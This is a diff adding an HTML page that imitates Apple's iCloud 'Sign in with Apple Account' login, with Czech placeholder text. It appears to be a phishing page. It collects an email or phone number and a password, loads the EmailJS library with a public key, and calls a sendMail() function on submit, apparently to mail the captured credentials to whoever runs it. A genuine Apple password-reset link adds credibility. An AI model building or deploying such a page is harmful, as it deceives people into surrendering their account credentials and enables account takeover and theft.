@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iCloud</title>
+    <link rel="stylesheet" href="iCloud.css">
+    <script src="script.js"></script>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "X-e0YP6ic0yIU7uga",
+      });
+   })();
+</script>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css" integrity="sha512-9xKTRVabjVeZmc+GUW8GgSmcREDunMM+Dt/GrzchfN8tkwHizc5RP4Ok/MXFFy5rIjJjzhndFScTceq5e6GvVQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+
+    <h5><i class="fa-brands fa-apple" href=""></i> iCloud</h5>
+
+
+<div class="container">
+    <div class="logo">
+        <i class="fa-brands fa-apple"></i>
+    </div>
+    <div class="login">
+        <h1>Sign in with Apple Account</h1>
+        <form >
+            <input type="text"  name="email_from" id="emailFrom" class="input-field" required placeholder="Email nebo telefonní číslo"> 
+            <input type="password" name="password" id="password" class="input-field" required="" placeholder="Heslo">            
+           
+            <a href="aj.html" onclick="sendMail()"><i class="fa-solid fa-arrow-right-to-bracket"></i></a><br>
+
+
+
+
+            <input class="checkboxbox" type="checkbox" id="" name="vehicle1" value="Bike">
+            <label class="checkbox" for="vehicle1">Keep me signed in</label><br>
+
+            <div class="links">
+                <a href="https://iforgot.apple.com/password/verify/appleid" type="submit" class="new-account">Forgot password?</a><br>
+                <a type="submit" class="create">Create Apple Account</a>
+            </div>
+
+        </form>
+    </div>
+
+</div>
+
+</body>
+</html>
